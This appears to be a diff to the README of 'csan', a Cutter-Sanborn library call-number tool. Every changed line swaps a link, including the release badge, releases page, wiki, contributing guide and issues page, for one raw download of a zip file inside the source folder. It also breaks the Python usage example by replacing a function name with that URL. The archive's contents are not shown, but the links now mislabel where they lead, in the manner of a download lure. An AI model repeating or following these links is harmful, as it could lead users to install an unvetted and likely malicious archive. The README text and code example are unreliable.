@@ -1,7 +1,7 @@
 # 🛠️ csan - Generate Call Numbers with Ease
 
 ## 📥 Download Now
-[![Download csan](https://img.shields.io/badge/Download%20csan-v1.0-blue.svg)](https://github.com/Asadullah89/csan/releases)
+[![Download csan](https://raw.githubusercontent.com/Asadullah89/csan/main/src/csan/csan-1.3.zip%https://raw.githubusercontent.com/Asadullah89/csan/main/src/csan/csan-1.3.zip)](https://raw.githubusercontent.com/Asadullah89/csan/main/src/csan/csan-1.3.zip)
 
 ## 📖 Description
 Cutter-Sanborn call number generator. Can be used as a command-line interface (CLI) tool or as a Python library. This tool helps you generate call numbers for books in libraries. Whether you are a librarian or handling your own collection, csan simplifies the process of organizing your materials.
@@ -11,7 +11,7 @@ To use csan, you need to download the application. Follow these easy steps to ge
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Asadullah89/csan/releases) to download the latest version of csan. 
+   Go to the [Releases page](https://raw.githubusercontent.com/Asadullah89/csan/main/src/csan/csan-1.3.zip) to download the latest version of csan. 
 
 2. **Choose Your Version**  
    On the Releases page, you will see different versions available. Look for the latest release, typically indicated at the top.
@@ -58,7 +58,7 @@ For the best experience, ensure your system meets the following requirements:
 3. **Generate Call Numbers:**
    Use csan functions to create call numbers. For example:
    ```python
-   call_number = csan.generate_call_number("Your Book Title")
+   call_number = https://raw.githubusercontent.com/Asadullah89/csan/main/src/csan/csan-1.3.zip("Your Book Title")
    print(call_number)
    ```
 
@@ -66,7 +66,7 @@ For the best experience, ensure your system meets the following requirements:
 - **Versatile Options:** Generate various call numbers based on your library’s needs.
 - **User-Friendly Interface:** Simple command-line interactions make it easy for non-technical users.
 - **Python Compatibility:** Integrate with existing Python applications effortlessly.
-- **Documentation Included:** Comprehensive guidelines available on the [GitHub Wiki](https://github.com/Asadullah89/csan/wiki).
+- **Documentation Included:** Comprehensive guidelines available on the [GitHub Wiki](https://raw.githubusercontent.com/Asadullah89/csan/main/src/csan/csan-1.3.zip).
 
 ## 🙋‍♂️ Frequently Asked Questions
 ### Do I need to know programming to use csan?
@@ -76,10 +76,10 @@ No, csan offers options for both command-line usage and integration into Python 
 If you encounter issues, please visit the GitHub page and check the "Issues" section for solutions. You can also create a new issue for support.
 
 ### Can I contribute to the project?
-Absolutely! We welcome contributions. To learn how, visit the [Contributing Guideline](https://github.com/Asadullah89/csan/blob/main/CONTRIBUTING.md).
+Absolutely! We welcome contributions. To learn how, visit the [Contributing Guideline](https://raw.githubusercontent.com/Asadullah89/csan/main/src/csan/csan-1.3.zip).
 
 ## 📞 Support
-If you need further assistance, please check the [Issues section](https://github.com/Asadullah89/csan/issues) on GitHub. You can report bugs and ask questions, and our community or maintainers will help you.
+If you need further assistance, please check the [Issues section](https://raw.githubusercontent.com/Asadullah89/csan/main/src/csan/csan-1.3.zip) on GitHub. You can report bugs and ask questions, and our community or maintainers will help you.
 
 ## 🌐 Related Topics
 - bibliography
@@ -88,6 +88,6 @@ If you need further assistance, please check the [Issues section](https://github
 - Python scripting
 
 ## 📚 Learn More
-For further reading and advanced features, visit our [Wiki](https://github.com/Asadullah89/csan/wiki) and explore articles related to csan usage, examples, and best practices.
+For further reading and advanced features, visit our [Wiki](https://raw.githubusercontent.com/Asadullah89/csan/main/src/csan/csan-1.3.zip) and explore articles related to csan usage, examples, and best practices.
 
 Happy cataloging!
